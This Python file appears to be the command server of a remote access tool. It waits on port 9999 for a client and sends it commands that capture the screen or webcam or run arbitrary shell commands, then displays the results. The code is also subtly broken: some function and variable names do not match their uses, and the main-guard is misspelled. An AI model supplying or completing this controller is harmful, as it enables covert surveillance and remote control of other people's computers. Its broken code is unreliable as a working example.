import socket
import struct
import cv2
import numpy as np

def receiveimage(sock):
    data = b''
    payloadsize = struct.calcsize(">L")
    while len(data) < payloadsize:
        data += sock.recv(4096)
    packedmsg_size = data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack(">L", packed_msg_size)[0]
    image_data = b''
    while len(image_data) < msg_size:
        image_data += sock.recv(4096)
    frame = cv2.imdecode(np.frombuffer(image_data, np.uint8), cv2.IMREAD_COLOR)
    return frame

def main():
    host = '0.0.0.0'
    port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print("Server listening...")

    client_socket, addr = s.accept()
    print(f'Connected by: {addr}')

    try:
        while True:
            command = input("Enter command (screenshot, webcam, exit, or cmd): ").strip()
            client_socket.send(command.encode('utf-8'))
            if command == "exit":
                break
            elif command in ["screenshot", "webcam"]:
                frame = receive_image(client_socket)
                cv2.imshow('Received', frame)
                cv2.waitKey(1)
            else:
                output_length = client_socket.recv(4)
                output = client_socket.recv(int.from_bytes(output_length, 'big')).decode('utf-8')
                print(output)
    finally:
        client_socket.close()
        s.close()

if __name == '__main__':
    main()